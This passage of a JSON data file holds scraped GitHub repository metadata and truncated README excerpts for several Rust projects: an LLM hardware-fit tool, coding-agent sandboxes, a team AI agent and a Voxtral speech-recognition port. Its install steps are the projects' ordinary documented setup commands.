Chart, Sankey |\n| **Planning** | Gantt, Timeline, Journey, Kanban |\n| **Architecture** | C4, Block, Architecture, Requirement |\n| **Other** | Mindmap, Git Graph, ZenUML, Packet, Radar, Treemap |\n\n<table>\n<tr>\n<td align=\"center\" width=\"50%\">\n<strong>Flowchart</strong><br>\n<img src=\"docs/comparisons/flowchart_mmdr.svg\" alt=\"Flowchart\" width=\"100%\">\n</td>\n<td align=\"center\" width=\"50%\">\n<strong>Class Diagram</strong><br>\n<im",
      "default_branch": "master"
    },
    "fetched_at": "2026-02-20T03:28:21.062877"
  },
  {
    "basic_info": {
      "name": "llmfit",
      "full_name": "AlexsJones/llmfit",
      "owner": "AlexsJones",
      "description": "157 models. 30 providers. One command to find what runs on your hardware.",
      "url": "https://github.com/AlexsJones/llmfit",
      "clone_url": "https://github.com/AlexsJones/llmfit.git",
      "ssh_url": "git@github.com:AlexsJones/llmfit.git",
      "homepage": "",
      "created_at": "2026-02-15T16:11:31Z",
      "updated_at": "2026-02-20T03:27:06Z",
      "pushed_at": "2026-02-19T14:19:15Z"
    },
    "stats": {
      "stars": 934,
      "forks": 54,
      "watchers": 934,
      "open_issues": 8,
      "size": 9670
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 175688,
        "Python": 49075,
        "Shell": 7814,
        "Makefile": 1367,
        "HTML": 288
      },
      "license": "MIT License",
      "topics": [
        "llm",
        "openclaw",
        "skill"
      ]
    },
    "content": {
      "readme": "# llmfit\n\n<p align=\"center\">\n  <img src=\"assets/icon.svg\" alt=\"llmfit icon\" width=\"128\" height=\"128\">\n</p>\n\n**157 models. 30 providers. One command to find what runs on your hardware.**\n\nA terminal tool that right-sizes LLM models to your system's RAM, CPU, and GPU. Detects your hardware, scores each model across quality, speed, fit, and context dimensions, and tells you which ones will actually run well on your machine.\n\nShips with an interactive TUI (default) and a classic CLI mode. Supports multi-GPU setups, MoE architectures, dynamic quantization selection, and speed estimation.\n\n### Quick install (macOS / Linux)\n\n```sh\ncurl -fsSL https://llmfit.axjns.dev/install.sh | sh\n```\n_Downloads the latest release binary from GitHub and installs it to `/usr/local/bin` (or `~/.local/bin`)_\n\nOr\n```sh\nbrew tap AlexsJones/llmfit\nbrew install llmfit\n```\n\nWindows users: see the **Install** section below.\n\n![demo](demo.gif)\n\nExample of a medium performance home laptop\n\n![home](home_laptop.png)\n\n\nExample of models with Mixture-of-Experts architectures\n\n![moe](moe.png)\n\nDownloading a model via Ollama integration\n\n![download](download.gif)\n---\n\n## Install\n\n### Cargo (Windows / macOS / Linux)\n\n```sh\ncargo install llmfit\n```\n\nIf `cargo` is not installed yet, install Rust via [rustup](https://rustup.rs/).\n\n### macOS / Linux\n\n#### Homebrew\n\n```sh\nbrew tap AlexsJones/llmfit\nbrew install llmfit\n```\n\n#### Quick install\n\n```sh\ncurl -fsSL https://llmfit.axjns.dev/install.sh | sh\n```\n\nDownloads the latest release binary from GitHub and installs it to `/usr/local/bin` (or `~/.local/bin`).\n\n### From source\n\n```sh\ngit clone https://github.com/AlexsJones/llmfit.git\ncd llmfit\ncargo build --release\n# binary is at target/release/llmfit\n```\n\n---\n\n## Usage\n\n### TUI (default)\n\n```sh\nllmfit\n```\n\nLaunches the interactive terminal UI. Your system specs (CPU, RAM, GPU name, VRAM, backend) are shown at the top. Models are listed in a scrollable table sorted by composite score. Each row shows the model's score, estimated tok/s, best quantization for your hardware, run mode, memory usage, and use-case category.\n\n| Key | Action |\n|---|---|\n| `Up` / `Down` or `j` / `k` | Navigate models |\n| `/` | Enter search mode (partial match on name, provider, params, use case) |\n| `Esc` or `Enter` | Exit search mode |\n| `Ctrl-U` | Clear search |\n| `f` | Cycle fit filter: All, Runnable, Perfect, Good, Marginal |\n| `p` | Open provider filter popup |\n| `i` | Toggle installed-first sorting (Ollama only) |\n| `d` | Pull/download selected model via Ollama |\n| `r` | Refresh installed models from Ollama |\n| `1`-`9` | Toggle provider visibility |\n| `Enter` | Toggle detail view for selected model |\n| `PgUp` / `PgDn` | Scroll by 10 |\n| `g` / `G` | Jump to top / bottom |\n| `q` | Quit |\n\n### CLI mode\n\nUse `--cli` or any subcommand to get classic table output:\n\n```sh\n# Table of all models ranked by fit\nllmfit --cli\n\n# Only perfectly fitting models, top 5\nllmfit fit --perfect -n 5\n\n# Show detected system specs\nllmfit system\n\n# List all models in the database\nllmfit list\n\n# Search by name, provider, or size\nllmfit search \"llama 8b\"\n\n# Detailed view of a single model\nllmfit info \"Mistral-7B\"\n\n# Top 5 recommendations (JSON, for agent/script consumption)\nllmfit recommend --json --limit 5\n\n# Recommendations filtered by use case\nllmfit recommend --json --use-case coding --limit 3\n```\n\n### JSON output\n\nAdd `--json` to any subcommand for machine-readable output:\n\n```sh\nllmfit --json system     # Hardware specs as JSON\nllmfit --json fit -n 10  # Top 10 fits as JSON\nllmfit recommend --json  # Top 5 recommendations (JSON is default for recommend)\n```\n\n---\n\n## How it works\n\n1. **Hardware detection** -- Reads total/available RAM via `sysinfo`, counts CPU cores, and probes for GPUs:\n   - **NVIDIA** -- Multi-GPU support via `nvidia-smi`. Aggregates VRAM across all detected GPUs. Falls back to VRAM estimation from GPU model name if reporting fails.\n   - **AMD** -- Detected via `rocm-smi`.\n   - **Intel Arc** -- Discrete VRAM via sysfs, integrated via `lspci`.\n   - **Apple Silicon** -- Unified memory via `system_profiler`. VRAM = system RAM.\n   - **Backend detection** -- Automatically identifies the acceleration backend (CUDA, Metal, ROCm, SYCL, CPU ARM, CPU x86) for speed estimation.\n\n2. **Model database** -- 157 models sourced from the HuggingFace API, stored in `data/hf_models.json` and embedded at compile time. Memory requirements are computed from parameter counts across a quantization hierarchy (Q8_0 through Q2_K). VRAM is the primary constraint for GPU inference; system RAM is the fallback for CPU-only execution.\n\n   **MoE support** -- Models with Mixture-of-Experts architectures (Mixtral, DeepSeek-V2/V3) are detected automatically. Only a subset of experts is active per token, so the effective VRAM requirement is much lower than total parameter count suggests. For example, Mixtral 8x7B has 46.7B total parameters but only activates ~12.9B per token, reducing VRAM from 23.9 GB to ~6.6 GB wi",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:22.239135"
  },
  {
    "basic_info": {
      "name": "sandbox-agent",
      "full_name": "rivet-dev/sandbox-agent",
      "owner": "rivet-dev",
      "description": "Run Coding Agents in Sandboxes. Control Them Over HTTP. Supports Claude Code, Codex, OpenCode, and Amp.",
      "url": "https://github.com/rivet-dev/sandbox-agent",
      "clone_url": "https://github.com/rivet-dev/sandbox-agent.git",
      "ssh_url": "git@github.com:rivet-dev/sandbox-agent.git",
      "homepage": "https://sandboxagent.dev",
      "created_at": "2026-01-25T10:03:02Z",
      "updated_at": "2026-02-19T23:50:26Z",
      "pushed_at": "2026-02-18T07:45:32Z"
    },
    "stats": {
      "stars": 881,
      "forks": 60,
      "watchers": 881,
      "open_issues": 60,
      "size": 47918
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 731002,
        "TypeScript": 603722,
        "HTML": 73728,
        "Dockerfile": 26354,
        "JavaScript": 18147,
        "Shell": 15105,
        "CSS": 5487,
        "Astro": 4394,
        "PowerShell": 3387,
        "Just": 2584
      },
      "license": "Apache License 2.0",
      "topics": [
        "agent",
        "ai",
        "amp",
        "claude",
        "claude-code",
        "codex",
        "daytona",
        "e2b",
        "opencode",
        "sandbox"
      ]
    },
    "content": {
      "readme": "<p align=\"center\">\n  <img src=\".github/media/banner.png\" alt=\"Sandbox Agent SDK\" />\n</p>\n\n<h3 align=\"center\">Run Coding Agents in Sandboxes. Control Them Over HTTP.</h3>\n\n<p align=\"center\">\n  A server that runs inside your sandbox. Your app connects remotely to control Claude Code, Codex, OpenCode, Cursor, Amp, or Pi ‚Äî streaming events, handling permissions, managing sessions.\n</p>\n\n<p align=\"center\">\n  <a href=\"https://sandboxagent.dev/docs\">Documentation</a> ‚Äî <a href=\"https://sandboxagent.dev/docs/api-reference\">API Reference</a> ‚Äî <a href=\"https://rivet.dev/discord\">Discord</a>\n</p>\n\n<p align=\"center\">\n  <em><strong>Experimental:</strong> <a href=\"./gigacode/\">Gigacode</a> ‚Äî use OpenCode's TUI with any coding agent.</em>\n</p>\n\n## Why Sandbox Agent?\n\nRunning coding agents remotely is hard. Existing SDKs assume local execution, SSH breaks TTY handling and streaming, and every agent has a different API. Building from scratch means reimplementing everything for each coding agent.\n\nSandbox Agent solves three problems:\n\n1. **Coding agents need sandboxes** ‚Äî You can't let AI execute arbitrary code on your production servers. Coding agents need isolated environments, but existing SDKs assume local execution. Sandbox Agent is a server that runs inside the sandbox and exposes HTTP/SSE.\n\n2. **Every coding agent is different** ‚Äî Claude Code, Codex, OpenCode, Cursor, Amp, and Pi each have proprietary APIs, event formats, and behaviors. Swapping agents means rewriting your integration. Sandbox Agent provides one HTTP API ‚Äî write your code once, swap agents with a config change.\n\n3. **Sessions are ephemeral** ‚Äî Agent transcripts live in the sandbox. When the process ends, you lose everything. Sandbox Agent streams events in a universal schema to your storage. Persist to Postgres, ClickHouse, or [Rivet](https://rivet.dev). Replay later, audit everything.\n\n## Features\n\n- **Universal Agent API**: Single interface to control Claude Code, Codex, OpenCode, Cursor, Amp, and Pi with full feature coverage\n- **Universal Session Schema**: Standardized schema that normalizes all agent event formats for storage and replay\n- **Runs Inside Any Sandbox**: Lightweight static Rust binary. One curl command to install inside E2B, Daytona, Vercel Sandboxes, or Docker\n- **Server or SDK Mode**: Run as an HTTP server or embed with the TypeScript SDK\n- **OpenAPI Spec**: [Well documented](https://sandboxagent.dev/docs/api-reference) and easy to integrate from any language\n- **OpenCode SDK & UI Support** *(Experimental)*: [Connect OpenCode CLI, SDK, or web UI](https://sandboxagent.dev/docs/opencode-compatibility) to control agents through familiar OpenCode tooling\n\n## Architecture\n\n![Agent Architecture Diagram](./.github/media/agent-diagram.gif)\n\nThe Sandbox Agent acts as a universal adapter between your client application and various coding agents. Each agent has its own adapter that handles the translation between the universal API and the agent-specific interface.\n\n- **Embedded Mode**: Runs agents locally as subprocesses\n- **Server Mode**: Runs as HTTP server from any sandbox provider\n\n[Architecture documentation](https://sandboxagent.dev/docs)\n\n## Components\n\n| Component | Description |\n|-----------|-------------|\n| **Server** | Rust daemon (`sandbox-agent server`) exposing the HTTP + SSE API |\n| **SDK** | TypeScript client with embedded and server modes |\n| **Inspector** | Built-in UI at inspecting sessions and events |\n| **CLI** | `sandbox-agent` (same binary, plus npm wrapper) mirrors the HTTP endpoints |\n\n## Get Started\n\nChoose the installation method that works best for your use case.\n\n### Skill\n\nInstall skill with:\n\n```bash\nnpx skills add rivet-dev/skills -s sandbox-agent\n```\n\n```bash\nbunx skills add rivet-dev/skills -s sandbox-agent\n```\n\n### TypeScript SDK\n\nImport the SDK directly into your Node or browser application. Full type safety and streaming support.\n\n**Install**\n\n```bash\nnpm install sandbox-agent@0.2.x\n```\n\n```bash\nbun add sandbox-agent@0.2.x\n# Optional: allow Bun to run postinstall scripts for native binaries (required for SandboxAgent.start()).\nbun pm trust @sandbox-agent/cli-linux-x64 @sandbox-agent/cli-linux-arm64 @sandbox-agent/cli-darwin-arm64 @sandbox-agent/cli-darwin-x64 @sandbox-agent/cli-win32-x64\n```\n\n**Setup**\n\nLocal (embedded mode):\n\n```ts\nimport { SandboxAgent } from \"sandbox-agent\";\n\nconst client = await SandboxAgent.start();\n```\n\nRemote (server mode):\n\n```ts\nimport { SandboxAgent } from \"sandbox-agent\";\n\nconst client = await SandboxAgent.connect({\n  baseUrl: \"http://127.0.0.1:2468\",\n  token: process.env.SANDBOX_TOKEN,\n});\n```\n\n**API Overview**\n\n```ts\nconst agents = await client.listAgents();\n\nawait client.createSession(\"demo\", {\n  agent: \"codex\",\n  agentMode: \"default\",\n  permissionMode: \"plan\",\n});\n\nawait client.postMessage(\"demo\", { message: \"Hello from the SDK.\" });\n\nfor await (const event of client.streamEvents(\"demo\", { offset: 0 })) {\n  console.log(event.type, event.data);\n}\n```\n\n`permissionMode: \"accep",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:23.410531"
  },
  {
    "basic_info": {
      "name": "spacebot",
      "full_name": "spacedriveapp/spacebot",
      "owner": "spacedriveapp",
      "description": "An AI agent for teams, communities, and multi-user environments.",
      "url": "https://github.com/spacedriveapp/spacebot",
      "clone_url": "https://github.com/spacedriveapp/spacebot.git",
      "ssh_url": "git@github.com:spacedriveapp/spacebot.git",
      "homepage": "https://spacebot.sh",
      "created_at": "2026-02-11T23:53:16Z",
      "updated_at": "2026-02-20T03:11:24Z",
      "pushed_at": "2026-02-20T03:05:29Z"
    },
    "stats": {
      "stars": 791,
      "forks": 105,
      "watchers": 791,
      "open_issues": 15,
      "size": 2767
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 1351950,
        "TypeScript": 464673,
        "Jinja": 42622,
        "SCSS": 9417,
        "Shell": 3630,
        "Dockerfile": 3229,
        "HTML": 281,
        "JavaScript": 75
      },
      "license": "Other",
      "topics": [
        "agent",
        "ai"
      ]
    },
    "content": {
      "readme": "<p align=\"center\">\n  <img src=\".github/Ball.png\" alt=\"Spacebot\" width=\"120\" height=\"120\" />\n</p>\n\n<h1 align=\"center\">Spacebot</h1>\n\n<p align=\"center\">\n  <strong>An AI agent for teams, communities, and multi-user environments.</strong><br/>\n  Thinks, executes, and responds ‚Äî concurrently, not sequentially.<br/>\n  Never blocks. Never forgets.\n</p>\n\n<p align=\"center\">\n  <a href=\"https://fsl.software/\">\n    <img src=\"https://img.shields.io/static/v1?label=License&message=FSL-1.1-ALv2&color=000\" />\n  </a>\n  <a href=\"https://github.com/spacedriveapp/spacebot\">\n    <img src=\"https://img.shields.io/static/v1?label=Core&message=Rust&color=DEA584\" />\n  </a>\n  <a href=\"https://discord.gg/gTaF2Z44f5\">\n    <img src=\"https://img.shields.io/discord/949090953497567312?label=Discord&color=5865F2\" />\n  </a>\n</p>\n\n<p align=\"center\">\n  <a href=\"https://spacebot.sh\"><strong>spacebot.sh</strong></a> ‚Ä¢\n  <a href=\"#how-it-works\">How It Works</a> ‚Ä¢\n  <a href=\"#architecture\">Architecture</a> ‚Ä¢\n  <a href=\"#quick-start\">Quick Start</a> ‚Ä¢\n  <a href=\"#tech-stack\">Tech Stack</a> ‚Ä¢\n  <a href=\"https://docs.spacebot.sh\">Docs</a>\n</p>\n\n> **One-click deploy with [spacebot.sh](https://spacebot.sh)** ‚Äî connect your Discord, Slack, or Telegram, configure your agent, and go. No self-hosting required.\n\n<p align=\"center\">\n  <img src=\".github/spacebot-ui.jpg\" alt=\"Spacebot UI\" />\n</p>\n\n---\n\n## The Problem\n\nMost AI agent frameworks run everything in a single session. One LLM thread handles conversation, thinking, tool execution, memory retrieval, and context compaction ‚Äî all in one loop. When it's doing work, it can't talk to you. When it's compacting, it goes dark. When it retrieves memories, raw results pollute the context with noise.\n\n[OpenClaw](https://github.com/anomalyco/openclaw) _does_ have subagents, but handles them poorly and there's no enforcement to their use. The session is the bottleneck for everything.\n\nSpacebot splits the monolith into specialized processes that only do one thing, and delegate everything else.\n\n---\n\n## Built for Teams and Communities\n\nMost AI agents are built for one person in one conversation. Spacebot is built for many people working together ‚Äî a Discord community with hundreds of active members, a Slack workspace with teams running parallel workstreams, a Telegram group coordinating across time zones.\n\nThis is why the architecture exists. A single-threaded agent breaks the moment two people talk at once. Spacebot's delegation model means it can think about User A's question, execute a task for User B, and respond to User C's small talk ‚Äî all at the same time, without any of them waiting on each other.\n\n**For communities** ‚Äî drop Spacebot into a Discord server. It handles concurrent conversations across channels and threads, remembers context about every member, and does real work (code, research, file operations) without going dark. Fifty people can interact with it simultaneously.\n\n**For fast-moving channels** ‚Äî when messages are flying in, Spacebot doesn't try to respond to every single one. A message coalescing system detects rapid-fire bursts, batches them into a single turn, and lets the LLM read the room ‚Äî it picks the most interesting thing to engage with, or stays quiet if there's nothing to add. Configurable debounce timing, automatic DM bypass, and the LLM always knows which messages arrived together.\n\n**For teams** ‚Äî connect it to Slack. Each channel gets a dedicated conversation with shared memory. Spacebot can run long coding sessions for one engineer while answering quick questions from another. Workers handle the heavy lifting in the background while the channel stays responsive.\n\n**For multi-agent setups** ‚Äî run multiple agents on one instance. A community bot with a friendly personality on Discord, a no-nonsense dev assistant on Slack, and a research agent handling background tasks. Each with its own identity, memory, and security permissions. One binary, one deploy.\n\n### Deploy Your Way\n\n| Method                                 | What You Get                                                                                |\n| -------------------------------------- | ------------------------------------------------------------------------------------------- |\n| **[spacebot.sh](https://spacebot.sh)** | One-click hosted deploy. Connect your platforms, configure your agent, done.                |\n| **Self-hosted**                        | Single Rust binary. No Docker, no server dependencies, no microservices. Clone, build, run. |\n| **Docker**                             | Container image with everything included. Mount a volume for persistent data.               |\n\n---\n\n## Capabilities\n\n### Task Execution\n\nWorkers come loaded with tools for real work:\n\n- **Shell** ‚Äî run arbitrary commands with configurable timeouts\n- **File** ‚Äî read, write, and list files with auto-created directories\n- **Exec** ‚Äî run specific programs with arguments and environment variables\n- **[OpenCode](https://opencode.ai)** ‚Äî sp",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:24.585461"
  },
  {
    "basic_info": {
      "name": "vibe",
      "full_name": "lynaghk/vibe",
      "owner": "lynaghk",
      "description": "Easy Linux virtual machine on MacOS to sandbox LLM agents.",
      "url": "https://github.com/lynaghk/vibe",
      "clone_url": "https://github.com/lynaghk/vibe.git",
      "ssh_url": "git@github.com:lynaghk/vibe.git",
      "homepage": null,
      "created_at": "2026-01-28T13:04:55Z",
      "updated_at": "2026-02-19T22:26:05Z",
      "pushed_at": "2026-02-18T20:40:12Z"
    },
    "stats": {
      "stars": 734,
      "forks": 30,
      "watchers": 734,
      "open_issues": 3,
      "size": 109
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 41492,
        "Shell": 1935
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "Vibe is a quick, zero-configuration way to spin up a Linux virtual machine on Mac to sandbox LLM agents:\n\n```\n$ cd my-project\n$ vibe\n\n‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë\n‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë\n ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë\n ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë\n  ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë\n  ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë\n   ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñì‚ñí‚ñë  ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë\n\nHost                                      Guest                    Mode\n----------------------------------------  -----------------------  ----------\n/Users/dev/work/my-project                /root/my-project         read-write\n/Users/dev/.cache/vibe/.guest-mise-cache  /root/.local/share/mise  read-write\n/Users/dev/.m2                            /root/.m2                read-write\n/Users/dev/.cargo/registry                /root/.cargo/registry    read-write\n/Users/dev/.codex                         /root/.codex             read-write\n/Users/dev/.claude                        /root/.claude            read-write\n/Users/dev/.gemini                        /root/.gemini            read-write\n\nroot@vibe:~/my-project#\n```\n\nOn my M1 MacBook Air it takes ~10 seconds to boot.\n\n\nDependencies:\n\n- An ARM-based Mac running MacOS 13 (Ventura) or higher.\n- A network connection is required on the first run to download and configure the Debian Linux base image.\n- That's it!\n\n\n## Why use Vibe?\n\n- LLM agents are more fun to use with `--yolo`, since they're not always interrupting you to approve their commands.\n- Sandboxing the agent in a VM lets it install/remove whatever tools its lil' transformer heart desires, *without* wrecking your actual machine.\n- You control what the agent (and thus the upstream LLM provider) can actually see, by controlling exactly what's shared into the VM sandbox.\n  (This project was inspired by me running `codex` *without* `--yolo` and seeing it reading files outside of the directory I started it in --- not cool, bro.)\n\nI'm using virtual machines rather than containers because:\n\n- Virtualization is more secure against malicious escapes than containers or the MacOS sandbox framework.\n- Containers on MacOS require spinning up a virtual machine anyway.\n\nFinally, as a matter of taste and style:\n\n- The binary is < 1 MB.\n- I wrote the entire README myself, 100% with my human brain.\n- The entire implementation is in one ~1200 line Rust file.\n- The only Rust dependencies are the [Objc2](https://github.com/madsmtm/objc2) interop crates and the [lexopt](https://github.com/blyxxyz/lexopt) argument parser.\n- There are no emoji anywhere in this repository.\n\n\n## Install\n\nVibe is a single binary built with Rust.\n\nDownload [the latest binary built by GitHub actions](https://github.com/lynaghk/vibe/releases/tag/latest) and put it somewhere on your `$PATH`:\n\n    curl -LO https://github.com/lynaghk/vibe/releases/download/latest/vibe-macos-arm64.zip\n    unzip vibe-macos-arm64.zip\n    mkdir -p ~/.local/bin\n    mv vibe ~/.local/bin\n    export PATH=\"$HOME/.local/bin:$PATH\"\n\nIf you use [mise-en-place](https://mise.jdx.dev/):\n\n    mise use github:lynaghk/vibe@latest\n\nI'm not making formal releases or keeping a change log.\nI recommend reading the commit history and pinning to a specific version.\n\nYou can also install via `cargo`:\n\n    cargo install --locked --git https://github.com/lynaghk/vibe.git\n\nIf you don't have `cargo`, you need to install Rust:\n\n    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n\n\n## Using Vibe\n\n\n```\nvibe [OPTIONS] [disk-image.raw]\n\nOptions\n\n  --help                                                    Print this help message.\n  --version                                                 Print the version (commit SHA).\n  --no-default-mounts                                       Disable all default mounts, including .git and .vibe project subfolder masking.\n  --mount host-path:guest-path[:read-only | :read-write]    Mount `host-path` inside VM at `guest-path`.\n                                                            Defaults to read-write.\n                                                            Errors if host-path does not exist.\n  --cpus <count>                                            Number of virtual CPUs (default 2).\n  --ram <megabytes>                                         RAM size in megabytes (default 2048).\n  --script <path/to/script.sh>                              Run script in VM.\n  --send <some-command>                                     Type `some-command` followed by newline into the VM.\n  --expect <string> [timeout-seconds]                       Wait for `string` to appear in console output before executing next `--script` or `--send`.\n                                                            If `string` does not appear within timeout (default 30 seconds), shutdown VM with error.\n```\n\nInvoking vibe without a disk image:\n\n- shares the current directory with the VM\n- shares package manager cache directories with the VM, so that packages",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:25.751204"
  },
  {
    "basic_info": {
      "name": "voxtral-mini-realtime-rs",
      "full_name": "TrevorS/voxtral-mini-realtime-rs",
      "owner": "TrevorS",
      "description": "Streaming speech recognition running natively and in the browser. A pure Rust implementation of Mistral's Voxtral Mini 4B Realtime model using the Burn ML framework.",
      "url": "https://github.com/TrevorS/voxtral-mini-realtime-rs",
      "clone_url": "https://github.com/TrevorS/voxtral-mini-realtime-rs.git",
      "ssh_url": "git@github.com:TrevorS/voxtral-mini-realtime-rs.git",
      "homepage": "https://huggingface.co/spaces/TrevorJS/voxtral-mini-realtime",
      "created_at": "2026-02-04T23:22:00Z",
      "updated_at": "2026-02-19T19:34:43Z",
      "pushed_at": "2026-02-12T00:59:08Z"
    },
    "stats": {
      "stars": 639,
      "forks": 26,
      "watchers": 639,
      "open_issues": 0,
      "size": 3551
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 714631,
        "Python": 162436,
        "JavaScript": 82037,
        "HTML": 37508,
        "WGSL": 8866,
        "TypeScript": 8681,
        "Makefile": 1990,
        "Shell": 1167
      },
      "license": "Apache License 2.0",
      "topics": [
        "asr",
        "burn",
        "mistral",
        "rust",
        "voxtral-mini-realtime",
        "wasm"
      ]
    },
    "content": {
      "readme": "# Voxtral Mini 4B Realtime (Rust)\n\n[![HuggingFace](https://img.shields.io/badge/%F0%9F%A4%97-Model_on_HuggingFace-yellow)](https://huggingface.co/TrevorJS/voxtral-mini-realtime-gguf)\n[![Live Demo](https://img.shields.io/badge/%F0%9F%94%8A-Live_Demo-blue)](https://huggingface.co/spaces/TrevorJS/voxtral-mini-realtime)\n\nStreaming speech recognition running natively and in the browser. A pure Rust implementation of [Mistral's Voxtral Mini 4B Realtime](https://huggingface.co/mistralai/Voxtral-Mini-4B-Realtime-2602) model using the [Burn](https://burn.dev) ML framework.\n\n## Benchmarks\n\nNVIDIA DGX Spark (GB10, LPDDR5x), 16s test audio, 3-run average:\n\n| Path | Encode | Decode | Total | RTF | Tok/s | Memory |\n|------|--------|--------|-------|-----|-------|--------|\n| **Q4 GGUF native** | 1021 ms | 5578 ms | 6629 ms | **0.416** | **19.4** | 703 MB |\n| F32 native | 887 ms | 23689 ms | 24607 ms | 1.543 | 4.6 | 9.2 GB |\n| Q4 GGUF WASM | ‚Äî | ‚Äî | ~225 s | ~14.1 | ~0.5 | (browser) |\n\n- **RTF** (Real-Time Factor): 0.416 means transcription completes in under half the audio duration\n- Q4 decode is **4.2√ó faster** than F32 ‚Äî fused dequant+matmul avoids materializing 9 GB of weights\n- Custom WGSL compute shaders with vectorized u32 reads and vec4 dot products\n- Dual-path kernel dispatch: shared-memory tiled kernel for single-token decode, naive kernel for multi-row encode/prefill\n- **8.49% WER** on FLEURS English (647 utterances), vs. Mistral's reported 4.90% at f32\n\nThe Q4 GGUF quantized path (2.5 GB) runs entirely client-side in a browser tab via WASM + WebGPU. [Try it live.](https://huggingface.co/spaces/TrevorJS/voxtral-mini-realtime)\n\n## Quick Start\n\n### Native CLI\n\n```bash\n# Download model weights (~9 GB)\nuv run --with huggingface_hub \\\n  hf download mistralai/Voxtral-Mini-4B-Realtime-2602 --local-dir models/voxtral\n\n# Transcribe an audio file (f32 SafeTensors path)\ncargo run --release --features \"wgpu,cli,hub\" --bin voxtral-transcribe -- \\\n  --audio audio.wav --model models/voxtral\n\n# Or use the Q4 quantized path (~2.5 GB)\ncargo run --release --features \"wgpu,cli,hub\" --bin voxtral-transcribe -- \\\n  --audio audio.wav --gguf models/voxtral-q4.gguf --tokenizer models/voxtral/tekken.json\n```\n\n### Browser Demo\n\n```bash\n# Build WASM package\nwasm-pack build --target web --no-default-features --features wasm\n\n# Generate self-signed cert (WebGPU requires secure context)\nopenssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \\\n  -keyout /tmp/voxtral-key.pem -out /tmp/voxtral-cert.pem \\\n  -days 7 -nodes -subj \"/CN=localhost\"\n\n# Start dev server\nbun serve.mjs\n```\n\nOpen `https://localhost:8443`, accept the certificate, and click **Load from Server** to download the model shards. Record from your microphone or upload a WAV file to transcribe.\n\n[Hosted demo on HuggingFace Spaces](https://huggingface.co/spaces/TrevorJS/voxtral-mini-realtime) if you want to skip local setup.\n\n## Architecture\n\n```\nAudio (16kHz mono)\n  -> Mel spectrogram [B, 128, T]\n    -> Causal encoder (32 layers, 1280 dim, sliding window 750)\n      -> Conv 4x downsample -> Reshape [B, T/16, 5120]\n        -> Adapter [B, T/16, 3072]\n          -> Autoregressive decoder (26 layers, 3072 dim, GQA 32Q/8KV)\n            -> Token IDs -> Text\n```\n\n### Two Inference Paths\n\n| | F32 (native) | Q4 GGUF (native + browser) |\n|---|---|---|\n| Weights | SafeTensors (~9 GB) | GGUF Q4_0 (~2.5 GB) |\n| Linear ops | Burn tensor matmul | Custom WGSL shader (fused dequant + matmul) |\n| Embeddings | f32 tensor (1.5 GiB) | Q4 on GPU (216 MB) + CPU bytes for lookups |\n| Browser | No | Yes (WASM + WebGPU) |\n\n### Q4 Padding Workaround\n\nThe upstream mistral-common library left-pads audio with 32 silence tokens (at 12.5 Hz). After the mel/conv/reshape pipeline, this covers only 16 of the 38 decoder prefix positions with silence ‚Äî the remaining 22 contain actual audio. The f32 model handles this fine, but Q4_0 quantization makes the decoder sensitive to speech content in the prefix: audio that starts immediately with speech (mic recordings, clips with no leading silence) produces all-pad tokens instead of 